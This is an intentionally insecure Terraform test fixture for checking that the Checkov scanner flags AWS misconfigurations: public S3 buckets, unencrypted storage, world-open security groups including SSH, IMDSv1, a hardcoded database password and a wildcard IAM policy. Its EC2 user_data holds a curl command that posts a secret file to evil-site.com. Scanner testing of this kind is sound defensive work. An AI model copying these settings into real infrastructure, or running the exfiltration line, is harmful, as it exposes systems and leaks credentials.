# Deliberately insecure Terraform for testing Checkov
# This file contains multiple security issues that Checkov should catch

# Insecure S3 bucket - public read access
resource "aws_s3_bucket" "bad_bucket" {
  bucket = "my-insecure-bucket-${random_id.bucket_suffix.hex}"
}

resource "aws_s3_bucket_public_access_block" "bad_bucket_pab" {
  bucket = aws_s3_bucket.bad_bucket.id

  block_public_acls       = false  # Should be true
  block_public_policy     = false  # Should be true
  ignore_public_acls      = false  # Should be true
  restrict_public_buckets = false  # Should be true
}

# Unencrypted S3 bucket
resource "aws_s3_bucket_server_side_encryption_configuration" "bad_encryption" {
  bucket = aws_s3_bucket.bad_bucket.id

  # Missing - should have encryption enabled
}

# Security group with overly permissive rules
resource "aws_security_group" "bad_sg" {
  name_prefix = "insecure-sg"
  
  ingress {
    from_port   = 0
    to_port     = 65535
    protocol    = "tcp"
    cidr_blocks = ["0.0.0.0/0"]  # Open to world - bad!
  }
  
  ingress {
    from_port   = 22
    to_port     = 22
    protocol    = "tcp"
    cidr_blocks = ["0.0.0.0/0"]  # SSH open to world - very bad!
  }
  
  egress {
    from_port   = 0
    to_port     = 0
    protocol    = "-1"
    cidr_blocks = ["0.0.0.0/0"]
  }
}

# EC2 instance with security issues
resource "aws_instance" "bad_instance" {
  ami           = "ami-0abcdef1234567890"
  instance_type = "t3.micro"
  
  vpc_security_group_ids = [aws_security_group.bad_sg.id]
  
  # No encryption for EBS volumes
  root_block_device {
    encrypted = false  # Should be true
  }
  
  # IMDSv1 enabled (insecure)
  metadata_options {
    http_endpoint = "enabled"
    http_tokens   = "optional"  # Should be "required"
  }
  
  user_data = <<-EOF
    #!/bin/bash
    echo "password123" > /tmp/secret.txt  # Hardcoded secret!
    curl -X POST https://evil-site.com/steal -d "$(cat /tmp/secret.txt)"
  EOF
}

# RDS instance without encryption
resource "aws_db_instance" "bad_database" {
  allocated_storage    = 20
  storage_type         = "gp2"
  engine              = "mysql"
  engine_version      = "5.7"
  instance_class      = "db.t3.micro"
  db_name             = "testdb"
  username            = "admin"
  password            = "password123"  # Hardcoded password!
  
  storage_encrypted   = false  # Should be true
  publicly_accessible = true   # Should be false
  
  skip_final_snapshot = true
}

# IAM policy that's too permissive
resource "aws_iam_policy" "bad_policy" {
  name = "bad-policy"
  
  policy = jsonencode({
    Version = "2012-10-17"
    Statement = [
      {
        Effect = "Allow"
        Action = "*"        # Wildcard permissions - bad!
        Resource = "*"      # All resources - bad!
      }
    ]
  })
}

# Random ID for bucket naming
resource "random_id" "bucket_suffix" {
  byte_length = 8
}